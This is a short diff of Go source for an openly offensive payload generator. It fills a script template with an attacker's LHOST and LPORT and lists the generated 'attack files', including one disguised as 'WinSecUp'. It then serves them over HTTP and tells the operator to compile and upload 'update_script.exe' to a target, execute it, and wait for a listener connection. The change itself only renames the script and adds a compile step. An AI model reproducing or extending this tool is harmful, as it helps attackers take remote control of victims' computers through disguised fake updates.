@@ -26,7 +26,7 @@ func main() {
 	fmt.Println("LHOST:    ", LHOST)
 	fmt.Println("LPORT:    ", LPORT)
 
-	// Modify "update_script.cmd", adding LHOST IP
+	// Modify "update_script.go", adding LHOST IP
 	updateScript, err := os.ReadFile("update_script.template")
 	if err != nil {
 		fmt.Println("Error reading file:", err)
@@ -123,7 +123,7 @@ func main() {
 ******************************************
 [!] Attack files have been generated
 ******************************************
-[-] update_script.cmd
+[-] update_script.go
 [-] r1
 [-] WinSecUp
 
@@ -146,7 +146,7 @@ func main() {
 	// Serve requests that start with '/'
   http.Handle("/", handler)
 
-	fmt.Println("[!] Upload 'update_script.cmd' to target and execute")
+	fmt.Println("[!] Compile and Upload 'update_script.exe' to target and execute")
 	fmt.Println("[!] Check Listener for connection\n")
 	fmt.Println("******************************************")
 
